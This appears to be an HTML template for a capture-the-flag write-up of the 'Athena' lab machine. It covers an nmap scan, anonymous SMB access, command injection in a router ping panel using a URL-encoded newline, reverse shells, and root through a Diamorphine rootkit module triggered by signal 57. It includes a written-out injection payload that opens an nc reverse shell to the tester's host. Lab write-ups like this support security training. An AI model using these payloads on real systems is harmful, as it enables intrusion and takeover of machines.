{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Enumeration", "enumeration")}}

{{text("We begin with an nmap scan to identify open ports.")}}

{{console("nmap -T5 -p- -sV -sC 10.10.98.214", "Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-05 15:12 CET
Warning: 10.10.98.214 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.98.214
Host is up (0.072s latency).
Not shown: 61675 closed tcp ports (conn-refused), 3856 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3b:c8:f8:13:e0:cb:42:60:0d:f6:4c:dc:55:d8:3b:ed (RSA)
|   256 1f:42:e1:c3:a5:17:2a:38:69:3e:9b:73:6d:cd:56:33 (ECDSA)
|_  256 7a:67:59:8d:37:c5:67:29:e8:53:e8:1e:df:b0:c7:1e (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Athena - Gods of olympus
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-12-05T14:20:38
|_  start_date: N/A
|_clock-skew: -1s
|_nbstat: NetBIOS name: ROUTERPANEL, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 498.04 seconds
")}}

{{text("We find 4 open ports:")}}

{{list(['22 (SSH)', '80 (HTTP)', '139 (smbd)', '445 (smbd)'])}}

{{text("I firstly tried connecting to the SMB service. I was able to find a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>public</code> share and then I accessed it. Luckly anonymous login worked. There was a text file with a message for the administrator.")}}

{{console("cat msg_for_administrator.txt", "Dear Administrator,

I would like to inform you that a new Ping system is being developed and I left the corresponding application in a specific path, which can be accessed through the following address: /myrouterpanel

Yours sincerely,

Athena
Intern")}}

{{header("Shell as www-data", "shell-as-www-data")}}

{{text("Then I visited the web page and accessed the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/myrouterpanel</code> directory.")}}

{{text("It contained a tool for pinging other devices.")}}

{{image("../../static/writeups/athena/images/000001.jpg")}}

{{text("When I entered <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>localhost</code>, the tool worked correctly and redirected me to a page with the results.")}}

{{text("I tried chaining commands but that didn't work and I got a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Attempted hacking!</code> error.")}}

{{text("What worked was adding a URL encoded newline character (\n) at the end of the address and adding our command after that.")}}

{{image("../../static/writeups/athena/images/000003.jpg")}}

{{text("Now we should try to get a reverse shell.")}}

{{text("We set up a listener and send a POST request using Burp with parameter <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>ip=127.0.0.1%0Anc+10.9.6.6+1234+-e+/bin/sh&submit=</code>. We should get a connection.")}}

{{header("Shell as athena", "shell-as-athena")}}

{{text("We can upgrade our shell now.")}}

{{image("../../static/writeups/athena/images/000005.jpg")}}

{{text("I ran <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>pspy64</code> on the machine and found a script that runs in the background located at <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/usr/share/backup/backup.sh</code>.")}}

{{console("cat backup.sh", "#!/bin/bash

backup_dir_zip=~/backup

mkdir -p '$backup_dir_zip'

cp -r /home/athena/notes/* '$backup_dir_zip'

zip -r '$backup_dir_zip/notes_backup.zip' '$backup_dir_zip'

rm /home/athena/backup/*.txt
rm /home/athena/backup/*.sh

echo 'Backup completed...'")}}

{{text("It's a simple script that by copying some files creates a backup. We check that it's owned by user <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>athena</code> and is writeable by our current user.")}}

{{text("We go to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>revshells.com</code> and copy a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>nc mkfifo</code> reverse shell.")}}

{{text("We add it to the file.")}}

{{image("../../static/writeups/athena/images/000006.jpg")}}

{{text("We set up a listener and should get a reverse shell as <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>athena</code>.")}}

{{image("../../static/writeups/athena/images/000007.jpg")}}

{{header("Shell as root", "shell-as-root")}}

{{text("After upgrading our shell we check our sudo permissions.")}}

{{console("sudo -l", "Matching Defaults entries for athena on routerpanel:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User athena may run the following commands on routerpanel:
    (root) NOPASSWD: /usr/sbin/insmod /mnt/.../secret/venom.ko
")}}

{{text("Since I couldn't read this file, I downloaded it onto my machine and used <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>ghidra</code> to reverse engineer it.")}}

{{text("The functions contained <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>diamorphine</code> so I searched the internet for that.")}}

{{text("I found this page.")}}

{{link("https://github.com/m0nad/Diamorphine", "", "Diamorphine")}}

{{text("The description says that <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Sending a signal 64(to any pid) makes the given user become root</code>.")}}

{{text("I tried sending signal 64 to a couple of processes but I couldn't become root. I analyzed the file further.")}}

{{text("I found this interesting piece of code.")}}

{{image("../../static/writeups/athena/images/000008.jpg")}}

{{text("<code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>0x39</code> in decimal is <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>57</code> so if we send signal 57 instead of 64, we should become root.")}}

{{text("We run the file as sudo and send the correct signal to any process. We should become root.")}}

{{image("../../static/writeups/athena/images/000009.jpg")}}

{{script()}}